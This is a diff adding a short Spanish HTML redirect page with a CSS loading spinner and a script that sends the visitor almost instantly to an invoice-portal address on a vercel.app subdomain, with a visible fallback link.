@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Redireccionando...</title>
+    <style>
+      /* Estilos para la animación de carga */
+      .loader {
+        border: 8px solid #f3f3f3; /* Color del borde */
+        border-top: 8px solid #3498db; /* Color del borde superior (azul) */
+        border-radius: 50%; /* Hace que sea circular */
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite; /* Animación de rotación */
+        margin: 20px auto; /* Centrar el spinner */
+      }
+
+      /* Animación de rotación */
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Estilos para el texto */
+      .text {
+        text-align: center;
+        font-family: Arial, sans-serif;
+        margin-top: 20px;
+      }
+    </style>
+    <script>
+      // Redireccionar después de 1 milisegundo
+      setTimeout(function () {
+        window.location.href = "https://portalfacturasclaro.vercel.app/";
+      }, 1);
+    </script>
+  </head>
+  <body>
+    <!-- Animación de carga -->
+    <div class="loader"></div>
+    <!-- Texto de redirección -->
+    <div class="text">
+      <p>
+        Redireccionando a
+        <a href="https://portalfacturasclaro.vercel.app/"
+          >https://portalfacturasclaro.vercel.app/</a
+        >...
+      </p>
+    </div>
+  </body>
+</html>
